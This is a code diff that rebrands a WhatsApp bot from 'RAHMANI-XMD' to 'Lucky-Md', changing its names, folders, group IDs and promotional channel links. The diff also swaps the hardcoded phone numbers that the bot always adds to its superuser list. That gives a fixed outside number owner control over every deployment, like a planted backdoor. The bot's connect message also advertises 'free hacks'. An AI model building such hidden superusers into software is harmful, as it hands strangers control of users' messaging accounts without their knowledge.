@@ -57,13 +57,13 @@ const adamsapikey = process.env.BOT_OWNER;
 async function authentification() {
     try {
         //console.log("le data "+data)
-        if (!fs.existsSync(__dirname + "/auth/creds.json")) {
+        if (!fs.existsSync(__dirname + "/scan/creds.json")) {
             console.log("connexion en cour ...");
-            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
+            await fs.writeFileSync(__dirname + "/scan/creds.json", atob(session), "utf8");
             //console.log(session)
         }
-        else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
-            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
+        else if (fs.existsSync(__dirname + "/scan/creds.json") && session != "zokk") {
+            await fs.writeFileSync(__dirname + "/scan/creds.json", atob(session), "utf8");
         }
     }
     catch (e) {
@@ -79,11 +79,11 @@ setTimeout(() => {
 authentification();
     async function main() {
         const { version, isLatest } = await (0, baileys_1.fetchLatestBaileysVersion)();
-        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/auth");
+        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/scan");
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['RAHMANI-XMD', "safari", "1.0.0"],
+            browser: ['Lucky-Md', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -134,7 +134,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `RAHMANI-XMD is running 🚗\n${currentDateTime}`; // Format the bio text
+        const bioText = `Lucky_Md is running 🚗\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -149,7 +149,7 @@ setInterval(async () => {
 
     await zk.rejectCall(callId, callerId);
     await zk.sendMessage(callerId, {
-      text: "Hello😊,am RAHMANI-XMD a personal assistant,please try again later"
+      text: "Hello😊,am Lucky-Md a personal assistant,please try again later"
     });
   }
 });
@@ -778,7 +778,7 @@ async function sendVCard(jid, baseName) {
             document: { url: vCardPath },
             mimetype: 'text/vcard',
             fileName: `${name}.vcf`,
-            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N RAHMANI XMD👊`
+            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N LUCKY MD👊`
         });
 
         console.log(`vCard created and sent for: ${name} (${jid})`);
@@ -802,7 +802,7 @@ zk.ev.on("messages.upsert", async (m) => {
     if (!ms.message) return;
 
     const origineMessage = ms.key.remoteJid;
-    const baseName = "RAHMANI-XMD";
+    const baseName = "Lucky-Md";
 
     // Check if the message is from an individual and if contact is not saved
     if (origineMessage.endsWith("@s.whatsapp.net") && (!store.contacts[origineMessage] || !store.contacts[origineMessage].name)) {
@@ -814,7 +814,7 @@ zk.ev.on("messages.upsert", async (m) => {
         
         // Send additional message to inform the contact of their new saved name
         await zk.sendMessage(origineMessage, {
-            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nRAHMANI-XMD`
+            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nLUCKY_MD`
         });
 
         console.log(`Contact ${assignedName} has been saved and notified.`);
@@ -825,7 +825,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
 
 // Default auto-reply message
-let auto_reply_message = "Hello,its RAHMANI XMD on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
+let auto_reply_message = "Hello,its Lucky Md on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
 
 // Track contacts that have already received the auto-reply
 let repliedContacts = new Set();
@@ -1020,10 +1020,10 @@ if (conf.AUDIO_REPLY === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const abu1 = '255693629079';
-            const abu2 = '255693629079';
-            const abu3 = "255693629079";
-            const abu4 = '255693629079';
+            const abu1 = '255752593977';
+            const abu2 = '255752593977';
+            const abu3 = "255752593977";
+            const abu4 = '255752593977';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -1152,7 +1152,7 @@ if (conf.AUTO_READ === 'yes') {
                 // console.log("*nouveau status* ");
             }
             /** ******fin auto-status */
-             if (!dev && origineMessage == "120363353854480831@g.us") {
+             if (!dev && origineMessage == "120363158701337904@g.us") {
                 return;
             }
             
@@ -1172,7 +1172,7 @@ if (conf.AUTO_READ === 'yes') {
         
                 if (ms.message[mtype].contextInfo.mentionedJid && (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))    /*texte.includes(idBot.split('@')[0]) || texte.includes(conf.NUMERO_OWNER)*/) {
             
-                    if (origineMessage == "120363353854480831@g.us") {
+                    if (origineMessage == "120363158701337904@g.us") {
                         return;
                     } ;
             
@@ -1492,7 +1492,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://files.catbox.moe/aktbgo.jpg';
+        ppgroup = 'https://files.catbox.moe/7irwqn.jpeg';
     }
 
     try {
@@ -1620,18 +1620,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Rahmani is connecting...");
+                console.log("ℹ️ lucky is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Rahmani Connected to WhatsApp! ☺️");
+                console.log("✅ lucky Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Rahmani is Online 🕸\n\n");
+                console.log("Lucky is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Rahmani Commands ...\n");
+                console.log("Loading Lucky Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -1664,19 +1664,19 @@ zk.ev.on('group-participants.update', async (group) => {
 
                 let cmsg =` ⁠⁠⁠⁠
 
-   _RAHMANI-CONNECTED_
+   _BOT🦚CONNECTED_
 
 ║ Prefix: [ ${prefixe} ]
 ║ Mode: ${md}
-║ Model: RAHMANI_XMD
-║ Bot Name: RAHMANI-XMD-Bot 
-║ Owner: Rahmani
+║ Model: Lucky_Md
+║ Bot Name: Lucky-Md-Bot 
+║ Owner: FrediEzra
 ╚═════ ❖ •✦
 -_-<-<-<-<-<-<-<--<-<-<-<-<-<
 
-*🪀Follow my channel for updates 🔱*
+*🪀Follow my channel for updates and free hacks🙃*
  
-> https://whatsapp.com/channel/0029VatokI45EjxufALmY32X
+> https://whatsapp.com/channel/0029VaihcQv84Om8LP59fO3f
 
 *Heroku App Configuration*
  
